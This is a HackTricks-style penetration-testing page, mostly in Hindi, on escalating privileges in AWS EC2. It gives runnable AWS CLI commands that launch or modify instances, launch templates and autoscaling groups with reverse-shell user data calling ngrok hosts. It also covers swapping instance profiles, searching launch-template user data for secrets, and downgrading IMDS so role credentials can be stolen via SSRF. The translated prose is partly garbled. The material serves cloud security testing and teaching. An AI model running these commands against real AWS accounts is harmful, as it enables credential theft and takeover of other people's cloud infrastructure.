# AWS - EC2 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## EC2

अधिक **EC2 के बारे में जानकारी** के लिए देखें:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

एक attacker **IAM role attach करके एक instance बना सकता है और फिर instance में access कर सकता है** ताकि वह metadata endpoint से IAM role credentials चुरा सके।

- **Access via SSH**

एक नया instance चलाएँ जो **पहले से बनाई गई** **ssh key** (`--key-name`) का उपयोग करता हो और फिर उसमें ssh करें (यदि आप नया बनाना चाहते हैं तो आपको permission `ec2:CreateKeyPair` की आवश्यकता हो सकती है)।
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
- **rev shell के जरिए user data में पहुँच**

आप **user data** (`--user-data`) का उपयोग करके एक नया instance चला सकते हैं जो आपको **rev shell** भेजेगा। इस तरीके से आपको security group निर्दिष्ट करने की जरूरत नहीं है।
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
Be careful with GuradDuty if you use the credentials of the IAM role outside of the instance:

{{#ref}}
../../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md
{{#endref}}

**संभावित प्रभाव:** मौजूदा instance profiles से जुड़े किसी भी EC2 role पर सीधे privesc हो सकता है।

#### Privesc to ECS

इन permissions के सेट के साथ आप **create an EC2 instance and register it inside an ECS cluster** भी कर सकते हैं। इस तरह, ECS **services** उस **EC2 instance** में **run** होंगे जहाँ आपका access होगा और आप उन services (docker containers) में penetrate करके उनके संलग्न **ECS roles** को **steal** कर सकते हैं।
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
इस नए EC2 instance पर **ECS services को जबरदस्ती चलवाने** का तरीका जानने के लिए देखें:

{{#ref}}
../aws-ecs-privesc/README.md
{{#endref}}

यदि आप **नया instance नहीं बना सकते** लेकिन आपके पास permission `ecs:RegisterContainerInstance` है, तो आप instance को cluster के अंदर register करके टिप्पणी किए गए attack को अंजाम दे सकते हैं।

**Potential Impact:** Tasks से जुड़े ECS roles पर direct privesc.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

पिछले परिदृश्य की तरह, इन permissions वाले attacker एक compromised instance का **IAM role बदल** सकते हैं ताकि वह नए credentials चुरा सके।\
चूँकि एक instance profile में केवल 1 role हो सकता है, अगर instance profile के पास **पहले से एक role है** (आम मामला), तो आपको साथ ही **`iam:RemoveRoleFromInstanceProfile`** की आवश्यकता भी होगी।
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
यदि **instance profile has a role** और attacker इसे **cannot remove it**, तो एक और workaround मौजूद है। वह **find** कर सकता है एक **instance profile without a role** या **create a new one** (`iam:CreateInstanceProfile`), उस **instance profile** में वह **role** को **add** कर सकता है (जैसा पहले चर्चा की गई थी), और **associate the instance profile** compromised to a compromised i**nstance:**

- यदि instance **doesn't have any instance** profile (`ec2:AssociateIamInstanceProfile`)
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
**Potential Impact:** Direct privesc to a different EC2 role (you need to have compromised a AWS EC2 instance and some extra permission or specific instance profile status).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

With these permissions it's possible to change the instance profile associated to an instance so if the attack had already access to an instance he will be able to steal credentials for more instance profile roles changing the one associated with it.

- अगर इसमें **instance profile** है, तो आप instance profile को **हटा** (`ec2:DisassociateIamInstanceProfile`) और उसे **जोड़** सकते हैं
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
- या compromised instance का **instance profile** **replace** करें (`ec2:ReplaceIamInstanceProfileAssociation`).
```bash
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<value> --association-id <value>
```
**संभावित प्रभाव:** Direct privesc to a different EC2 role (आपके पास पहले से compromised एक AWS EC2 instance होना चाहिए और कुछ अतिरिक्त permission या specific instance profile status की आवश्यकता है).

### `ec2:RequestSpotInstances`,`iam:PassRole`

ऐसी permissions वाले हमलावर **`ec2:RequestSpotInstances`and`iam:PassRole`** के साथ एक **Spot Instance** request कर सकते हैं जिसमें **EC2 Role attached** हो और **user data** में एक **rev shell** हो.\
एक बार instance चलने के बाद, वह **IAM role चुरा सकता है**.
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
### `ec2:ModifyInstanceAttribute`

एक हमलावर जिसके पास **`ec2:ModifyInstanceAttribute`** है, वह instance के attributes बदल सकता है। इनमें से वह **change the user data** कर सकता है, जिसका मतलब है कि वह instance को **run arbitrary data.** करने के लिए कॉन्फ़िगर कर सकता है। इसका उपयोग EC2 instance पर एक **rev shell** प्राप्त करने के लिए किया जा सकता है।

ध्यान दें कि ये attributes केवल तभी **modified** किए जा सकते हैं जब instance stopped हो, इसलिए ज़रूरी **permissions** **`ec2:StopInstances`** और **`ec2:StartInstances`** हैं।
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**Potential Impact:** किसी बनाए गए instance से जुड़े किसी भी EC2 IAM Role पर सीधे privesc।

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

एक attacker जिसके पास permissions **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`and `ec2:ModifyLaunchTemplate`** हों, वह एक **नया Launch Template version** बना सकता है जिसमें **rev shell in** the **user data** और उस पर **any EC2 IAM Role on it** रखा जा सकता है, डिफ़ॉल्ट version बदल सकता है, और कोई भी **any Autoscaler group** **using** that **Launch Templat**e that is **configured** to use the **latest** or **the default version** उस template का उपयोग करके instances को **re-run the instances** करेगा और rev shell execute हो जाएगा।
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
**संभावित प्रभाव:** किसी दूसरे EC2 role पर सीधे privesc।

### (`autoscaling:CreateLaunchConfiguration` | `ec2:CreateLaunchTemplate`),  `iam:PassRole`, (`autoscaling:CreateAutoScalingGroup` | `autoscaling:UpdateAutoScalingGroup`)

ऐसा attacker जिसके पास permissions **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** हों, वह **Launch Configuration बना सकता है** जिसमें एक **IAM Role** और एक **rev shell** **user data** में हो, फिर वह उस config से **autoscaling group बना कर** rev shell द्वारा **IAM Role चुराने** का इंतज़ार कर सकता है।
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**संभावित प्रभाव:** किसी दूसरे EC2 role पर सीधे privesc।

### `!autoscaling`

`ec2:CreateLaunchTemplate` और `autoscaling:CreateAutoScalingGroup` **permissions का सेट IAM role तक privileges escalate करने के लिए पर्याप्त नहीं है** क्योंकि Launch Configuration या Launch Template में निर्दिष्ट role को attach करने के लिए आपको `iam:PassRole` और `ec2:RunInstances` permissions की आवश्यकता होती है (जो एक ज्ञात privesc है)।

### `ec2-instance-connect:SendSSHPublicKey`

एक attacker जिसके पास permission **`ec2-instance-connect:SendSSHPublicKey`** है, वह किसी user में एक ssh key जोड़ सकता है और (यदि उसके पास instance का ssh access है) इसका उपयोग access के लिए या privileges escalate करने के लिए कर सकता है।
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**संभावित प्रभाव:** Direct privesc to the EC2 IAM roles attached to running instances.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

जिस attacker के पास permission **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** है, वह **serial connection में एक ssh key जोड़ सकता है**। अगर serial सक्षम नहीं है, तो attacker को इसे सक्षम करने के लिए अनुमति **`ec2:EnableSerialConsoleAccess`** चाहिए।

serial port से कनेक्ट करने के लिए आपको मशीन के अंदर किसी उपयोगकर्ता का **username और password** भी जानना होगा।
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
यह तरीका privesc के लिए उतना उपयोगी नहीं है क्योंकि इसे exploit करने के लिए आपको username और password पता होना चाहिए।

**Potential Impact:** (Highly unprovable) रनिंग instances से जुड़े EC2 IAM roles पर direct privesc।

### `describe-launch-templates`,`describe-launch-template-versions`

चूंकि launch templates में versioning होता है, इसलिए एक attacker जिसके पास **`ec2:describe-launch-templates`** और **`ec2:describe-launch-template-versions`** permissions हों, वे इन्हें exploit करके sensitive जानकारी खोज सकते हैं, जैसे user data में मौजूद credentials. इसे करने के लिए, नीचे दिया गया script उपलब्ध launch templates के सभी versions के माध्यम से loop करता है:
```bash
for i in $(aws ec2 describe-launch-templates --region us-east-1 | jq -r '.LaunchTemplates[].LaunchTemplateId')
do
echo "[*] Analyzing $i"
aws ec2 describe-launch-template-versions --launch-template-id $i --region us-east-1 | jq -r '.LaunchTemplateVersions[] | "\(.VersionNumber) \(.LaunchTemplateData.UserData)"' | while read version userdata
do
echo "VersionNumber: $version"
echo "$userdata" | base64 -d
echo
done | grep -iE "aws_|password|token|api"
done
```
ऊपर दिए गए कमांड्स में, हालांकि हम कुछ पैटर्न (`aws_|password|token|api`) निर्दिष्ट कर रहे हैं, आप अन्य प्रकार की संवेदनशील जानकारी खोजने के लिए अलग regex का उपयोग कर सकते हैं।

मान लेते हैं कि हमें `aws_access_key_id` और `aws_secret_access_key` मिलते हैं, तो इन credentials का उपयोग करके हम AWS में authenticate कर सकते हैं।

**संभावित प्रभाव:** Direct privilege escalation to IAM user(s).

## संदर्भ

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

### `ec2:ModifyInstanceMetadataOptions` (IMDS downgrade to enable SSRF credential theft)

पीड़ित EC2 instance पर `ec2:ModifyInstanceMetadataOptions` कॉल करने की क्षमता रखने वाला हमलावर IMDS सुरक्षा को कमजोर कर सकता है — IMDSv1 सक्षम करके (`HttpTokens=optional`) और `HttpPutResponseHopLimit` बढ़ाकर। इससे instance metadata endpoint उन सामान्य SSRF/proxy पाथ्स के माध्यम से पहुँच योग्य हो जाता है जो instance पर चलने वाले एप्लिकेशन से उपलब्ध होते हैं। अगर हमलावर ऐसे किसी एप्लिकेशन में SSRF trigger कर सके, तो वे instance profile credentials प्राप्त कर सकते हैं और उनके साथ pivot कर सकते हैं।

- आवश्यक अनुमतियाँ: `ec2:ModifyInstanceMetadataOptions` लक्ष्य instance पर (साथ ही host पर SSRF तक पहुँचने/trigger करने की क्षमता)।
- लक्षित संसाधन: चल रही EC2 instance जिसमें संलग्न instance profile (IAM role) हो।

कमांड उदाहरण:
```bash
# 1) Check current metadata settings
aws ec2 describe-instances --instance-id <INSTANCE_ID> \
--query 'Reservations[0].Instances[0].MetadataOptions'

# 2) Downgrade IMDS protections (enable IMDSv1 and raise hop limit)
aws ec2 modify-instance-metadata-options --instance-id <INSTANCE_ID> \
--http-endpoint enabled --http-tokens optional \
--http-put-response-hop-limit 3 --instance-metadata-tags enabled

# 3) Through the SSRF, enumerate role name
curl "http://<VICTIM_PUBLIC_IP>:<APP_PORT>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 4) Through the SSRF, steal the temporary credentials
curl "http://<VICTIM_PUBLIC_IP>:<APP_PORT>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"

# 5) Use the stolen credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
aws sts get-caller-identity

# 6) Restore protections (require IMDSv2, low hop limit)
aws ec2 modify-instance-metadata-options --instance-id <INSTANCE_ID> \
--http-tokens required --http-put-response-hop-limit 1
```
संभावित प्रभाव: SSRF के माध्यम से instance profile credentials की चोरी, जो EC2 role permissions के साथ privilege escalation और lateral movement की ओर ले जाती है।
{{#include ../../../../banners/hacktricks-training.md}}
